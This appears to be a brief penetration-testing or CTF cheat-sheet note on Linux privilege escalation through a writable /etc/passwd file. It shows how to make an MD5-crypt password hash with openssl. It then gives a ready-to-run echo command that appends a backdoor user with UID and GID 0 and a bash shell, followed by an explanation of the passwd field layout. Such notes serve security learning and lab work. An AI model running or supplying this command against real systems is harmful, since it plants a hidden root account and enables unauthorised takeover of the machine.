- if write acces to `/etc/passwd`
  
`openssl passwd -1 -salt [salt] [password]` - create hash of password (it's `1`, not `l`)

`echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:I am root:/root:/bin/bash' >> /etc/passwd`
username:hash_of_passwd OR x (if 'x' hash stored in `/etc/shadow`):UID:GID:comment_field:home_dir (if empty -> `/`):command (typically shell)